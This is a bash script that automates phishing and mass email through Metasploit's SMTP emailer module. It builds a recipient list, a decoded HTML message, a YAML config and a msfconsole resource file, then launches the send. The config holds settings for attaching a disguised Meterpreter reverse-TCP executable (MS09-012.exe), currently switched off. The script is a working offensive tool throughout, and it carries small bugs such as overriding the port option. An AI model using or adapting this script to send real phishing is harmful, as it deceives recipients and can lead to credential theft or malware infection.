#!/bin/bash

ShowUsage() {
	echo "$0 will use metasploit's emailer module to send phishing/mass emails."
	echo ""
	echo "Options"
	echo "--smtp-server=<ip address>"
	echo "--use-ssl"
	echo "--from=<from email address>  Must just be the email address, no display name.  E.g. joesmith@mydomain.com"
	echo "--tofile=<file> File containing recipients.  Format can be 'firstname lastname, email' or just email"
	echo "--subject=<subject>"
	echo "--template=<file> EMail template file.  This is expecting text/html.  This should just contain the email body."
	echo "[--port=<port #>]	Default is 25"
	echo "[--ehlodomain=<host/domain>]	Default is random text.  May want to use something related to the sending domain"
	echo "[-v]	Verbose output"
	echo 
}

if [ $# -lt 5 ]; then
	ShowUsage
	exit 1
fi

SMTPSERVER=""
SMTPPORT=25
EHLODOMAIN=""
USESSL=0
MAILFROM=""
TOFILE=""
SUBJECT=""
TEMPLATE=""
VERBOSE=0

IFS_BAK=$IFS
IFS="
"

for i in $*
do
	case $i in
    	--smtp-server=*)
		SMTPSERVER=`echo $i | sed 's/[-a-zA-Z0-9]*=//'`
		;;
	--use-ssl)
		USESSL=1
		;;
	-v)
		VERBOSE=1
		;;
	--port=*)
		SMTPPORT=`echo $i | sed 's/[-a-zA-Z0-9]*=//' | sed 's|"||g'`
		;;
	--ehlodomain=*)
		EHLODOMAIN=`echo $i | sed 's/[-a-zA-Z0-9]*=//' | sed 's|"||g'`
		;;
	--from=*)
		MAILFROM=`echo $i | sed 's/[-a-zA-Z0-9]*=//' | sed 's|"||g'`
		;;
	--tofile=*)
		TOFILE=`echo $i | sed 's/[-a-zA-Z0-9]*=//'`
		;;
	--subject=*)
		SUBJECT=`echo "$i" | sed 's/[-a-zA-Z0-9]*=//' | sed 's|"||g'`
		;;
	--template=*)
		TEMPLATE=`echo $i | sed 's/[-a-zA-Z0-9]*=//'`
		;;
    	*)
                # unknown option
		echo "Unknown option: $i"
  		ShowUsage
		exit 3
		;;
  	esac
done

SMTPSERVER=`echo "$SMTPSERVER" | grep -Eo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"`

if [ ${#SMTPSERVER} -eq 0 ]; then
	echo "ERROR: Please provide an SMTP server IP address."
	exit 2
fi


if [ ${#MAILFROM} -eq 0 ]; then
	echo "ERROR: Please provide an email FROM address."
	exit 2
fi

if [ ${#TOFILE} -eq 0 ]; then
	echo "ERROR: Please provide a TO file."
	exit 2
fi

if [ ! -e $TOFILE ]; then
	echo "ERROR: Unable to find $TOFILE"
	exit 2
fi

if [ ${#SUBJECT} -eq 0 ]; then
	echo "ERROR: Please provide a subject."
	exit 2
fi

if [ ${#TEMPLATE} -eq 0 ]; then
	echo "ERROR: Please provide a template file."
	exit 2
fi

if [ ! -e $TEMPLATE ]; then
	echo "ERROR: Unable to find $TEMPLATE"
	exit 2
fi

SMTPPORT=25

echo "[`date`] Setting up emails from $MAILFROM using $SMTPSERVER:$SMTPPORT..."
echo "Subject: $SUBJECT"

CURUSER=`whoami`
CURDATE=`date +%Y-%m-%d_%H_%M_%S`
OUTPUTFILE=`echo "$CURUSER_$CURDATE"`
RECIPIENTFILE="/tmp/$OUTPUTFILE.recipients.txt"

if [ -e $RECIPIENTFILE ]; then
	rm $RECIPIENTFILE
fi

RECIPIENTS=`cat $TOFILE | grep -v "^#" | grep -v "^$"`

for CURRECIPIENT in $RECIPIENTS; do
	echo "$CURRECIPIENT" | grep -q ","

	if [ $? -eq 0 ]; then
		echo "$CURRECIPIENT" >> $RECIPIENTFILE
	else
		echo " ,$CURRECIPIENT" >> $RECIPIENTFILE
	fi
done

# Fix up email message.  If saved from Google, etc. it'll be a MIME format.  Need the text/html section
NEWTEMPLATE="/tmp/$OUTPUTFILE.msg.txt"
NEWMSG=`cat $TEMPLATE | grep -A50000 "^Content-Type: text/html" | grep -v -e "^Content-Type: text/html" -e "Content-Transfer-Encoding:" | sed "s|=$||g" | grep -Ev "^\-\-[0-9a-fA-F]{28,}\-\-$" | tr -d '\n'`

# =C2=A0 is unicode for &nbsp; so replace that first
TMPMSG=`echo "$NEWMSG" | sed "s|=C2=A0|\&nbsp;|g"`
NEWMSG=`echo "$TMPMSG"`

for((i=32;i<=126;i++))
do
  	if [ $i -ne 124 -a $i -ne 92 ]; then
		# 124 is the | and messes up sed, 92 is \ which messes stuff up too.
		REPLSTR=$(printf "%.2X" $i)
		NEWCHAR=`echo 0x$REPLSTR | xxd -r -p`
		TMPMSG=`echo "$NEWMSG" | sed "s|=$REPLSTR|$NEWCHAR|g"`
		NEWMSG=`echo "$TMPMSG"`
	fi
done

echo "$NEWMSG" > $NEWTEMPLATE

# Set up YAML configuration
echo "" > /tmp/sig.txt

echo "from: $MAILFROM" > /tmp/$OUTPUTFILE.yaml
echo "to: $RECIPIENTFILE" >> /tmp/$OUTPUTFILE.yaml
echo "subject: $SUBJECT" >> /tmp/$OUTPUTFILE.yaml
echo "type: text/html"  >> /tmp/$OUTPUTFILE.yaml
echo "msg_file: $NEWTEMPLATE" >> /tmp/$OUTPUTFILE.yaml
echo "wait: 3" >> /tmp/$OUTPUTFILE.yaml
echo "add_name: false"  >> /tmp/$OUTPUTFILE.yaml
echo "sig: false"  >> /tmp/$OUTPUTFILE.yaml
echo "sig_file: /tmp/sig.txt"  >> /tmp/$OUTPUTFILE.yaml
echo "attachment: false"  >> /tmp/$OUTPUTFILE.yaml
echo "attachment_file: test.jpg"  >> /tmp/$OUTPUTFILE.yaml
echo "attachment_file_name: msf.jpg"  >> /tmp/$OUTPUTFILE.yaml
echo "attachment_file_type: image/jpeg" >> /tmp/$OUTPUTFILE.yaml
echo "make_payload: false"  >> /tmp/$OUTPUTFILE.yaml
echo "zip_payload: true" >> /tmp/$OUTPUTFILE.yaml
echo "msf_ip: 127.0.0.1" >> /tmp/$OUTPUTFILE.yaml
echo "msf_port: 443" >> /tmp/$OUTPUTFILE.yaml
echo "msf_payload: windows/meterpreter/reverse_tcp" >> /tmp/$OUTPUTFILE.yaml
echo "msf_filename: MS09-012.exe" >> /tmp/$OUTPUTFILE.yaml
echo "msf_location: /pentest/exploits/framework3" >> /tmp/$OUTPUTFILE.yaml
echo "msf_change_ext: true" >> /tmp/$OUTPUTFILE.yaml
echo "msf_payload_ext: vxe" >> /tmp/$OUTPUTFILE.yaml

# Set up metasploit job
echo "use auxiliary/client/smtp/emailer2" > /tmp/$OUTPUTFILE.rc
echo "set MAILFROM $MAILFROM" >> /tmp/$OUTPUTFILE.rc
echo "set DATE `date`" >> /tmp/$OUTPUTFILE.rc
echo "set RHOST $SMTPSERVER" >> /tmp/$OUTPUTFILE.rc
echo "set RPORT $SMTPPORT" >> /tmp/$OUTPUTFILE.rc
if [ ${#EHLODOMAIN} -gt 0 ]; then
	echo "set DOMAIN $EHLODOMAIN" >> /tmp/$OUTPUTFILE.rc
fi

if [ $VERBOSE -eq 1 ]; then
	echo "set VERBOSE true" >> /tmp/$OUTPUTFILE.rc
fi

if [ $USESSL -eq 1 ]; then
	echo "set SSL true" >> /tmp/$OUTPUTFILE.rc
	echo "set SSLVerifyMode NONE" >> /tmp/$OUTPUTFILE.rc
else
	echo "set SSL false" >> /tmp/$OUTPUTFILE.rc
fi
echo "set YAML_CONFIG /tmp/$OUTPUTFILE.yaml" >> /tmp/$OUTPUTFILE.rc
echo "run" >> /tmp/$OUTPUTFILE.rc
echo "quit" >> /tmp/$OUTPUTFILE.rc

IFS=$IFS_BAK

msfconsole -r /tmp/$OUTPUTFILE.rc

rm /tmp/$OUTPUTFILE*

